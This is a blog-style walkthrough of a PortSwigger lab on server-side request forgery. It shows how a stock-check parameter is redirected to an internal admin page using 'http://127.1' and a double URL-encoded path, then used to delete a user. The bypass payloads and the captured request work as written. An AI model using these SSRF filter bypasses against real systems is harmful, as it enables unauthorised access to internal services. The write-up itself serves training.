---
title: "SSRF: challange 3"
date: "2024-02-09"
thumbnail: "/assets/img/thumbnail/ssrf.png"
---

# SSRF with blacklist-based input filter
---

Link: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

### solution

- start the lab and remember the objective is to open `/admin` and delete the user carlos
- if u try going to `/admin` endpoint, you will n't get the result as u can't access it directly u will get this message `Admin interface only available if logged in as an administrator, or if requested from loopback`
- so let's go to products and click check stock as challange describtion said
- intercept this request

```
POST /product/stock HTTP/1.1
Host: 0a8800100385496e84c90fc700fa00af.web-security-academy.net
Cookie: session=ffMtPXx2g8AmQYwWYmNulgDa0wkhrt4i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8800100385496e84c90fc700fa00af.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a8800100385496e84c90fc700fa00af.web-security-academy.net
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
```

- notice that stockApi parameter has a url as a value, so let's try to change it to `http://localhost/admin` and the send the request
- ummmmmmmmmmm it's blocked so let's try this `http://127.1`
- Nice we got response with status code 200 OK
- then let's try `http://127.1/admin`
- It's blocked so there may be restriction on `admin`
- let's do some obsufication like double url encoding of any character like a is example
- the payload became `http://127.1/%25%36%31dmin` sent the request
- Nice we got response with status code 200 OK
- when we look at the response body we see this

```html
<div>
    <span>wiener - </span>
    <a href="/admin/delete?username=wiener">Delete</a>
</div>
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
```

- and that's what we exactly need
- send the previous request again but with stockApi parameter value = `http://127.1/%25%36%31dmin/delete?username=carlos`
- Carlos is deleted
- Congratzzzzzzzzzzzzzzzzzzzzzzzzzzzz